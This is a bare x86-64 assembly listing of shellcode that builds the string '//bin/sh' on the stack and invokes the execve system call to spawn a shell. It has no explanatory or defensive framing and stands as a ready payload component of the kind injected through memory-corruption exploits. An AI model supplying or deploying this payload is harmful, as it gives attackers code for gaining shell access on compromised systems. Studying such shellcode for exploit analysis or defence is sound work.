section .text
    global _start

_start:
    xor     rax, rax            ; clear rax
    mov     rdi, rsp            ; pointer to "/bin/sh"
    push    rax
    mov     rbx, 0x68732f6e69622f2f  ; "//bin/sh"
    push    rbx
    mov     rdi, rsp
    xor     rsi, rsi
    xor     rdx, rdx
    mov     rax, 59             ; execve syscall
    syscall

